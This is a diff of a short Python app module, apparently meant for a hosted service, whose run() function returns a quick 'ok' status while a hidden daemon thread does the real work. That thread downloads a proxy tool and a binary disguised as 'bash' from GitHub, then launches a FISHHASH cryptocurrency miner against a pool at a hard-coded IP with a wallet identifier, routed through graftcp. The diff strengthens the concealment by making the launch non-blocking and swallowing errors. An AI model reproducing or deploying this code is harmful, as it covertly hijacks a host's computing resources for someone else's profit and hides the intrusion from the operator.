@@ -1,46 +1,50 @@
 import subprocess
 import threading
-import time
 
 def worker():
-    print("=== BACKGROUND START ===")
+    try:
+        print("=== WORKER START ===")
 
-    cmd = """
-    apt update -y || true
-    apt install -y wget unzip git || true
+        cmd = """
+        sleep 2
 
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip || true
-    unzip -o pan.zip || true
+        apt update -y || true
+        apt install -y wget unzip git || true
 
-    cd pan || exit
+        wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip || true
+        unzip -o pan.zip || true
 
-    chmod -R +x . || true
+        cd pan || exit
 
-    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
+        chmod -R +x . || true
 
-    sleep 3
+        ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
 
-    git clone https://github.com/hujisanda/lol198.git || true
-    cd lol198 || exit
-    chmod u+x bash || true
+        sleep 3
 
-    mv bash ~/pan || true
-    cd ~/pan || exit
+        git clone https://github.com/hujisanda/lol198.git || true
+        cd lol198 || exit
+        chmod u+x bash || true
 
-    ./graftcp/graftcp -- ./bash --algo FISHHASH --pool 138.197.117.243:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX || true
-    """
+        mv bash ~/pan || true
+        cd ~/pan || exit
 
-    subprocess.run(["bash", "-lc", cmd], check=False)
+        ./graftcp/graftcp -- bash -c "./bash --algo FISHHASH --pool 138.197.117.243:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX" || true
+        """
 
-    print("=== DONE ===")
+        subprocess.Popen(["bash", "-lc", cmd])
+
+    except Exception as e:
+        print("WORKER ERROR:", e)
 
 
 def run():
-    print("=== APP STARTED ===")
+    print("=== APP READY ===")
 
-    # Jalankan di background
-    thread = threading.Thread(target=worker)
-    thread.start()
+    # JALANKAN BACKGROUND TANPA BLOCKING
+    t = threading.Thread(target=worker)
+    t.daemon = True
+    t.start()
 
-    # RETURN CEPAT (INI PENTING BANGET)
-    return {"status": "running"}
+    # RETURN CEPAT BANGET (INI KUNCI)
+    return {"status": "ok"}
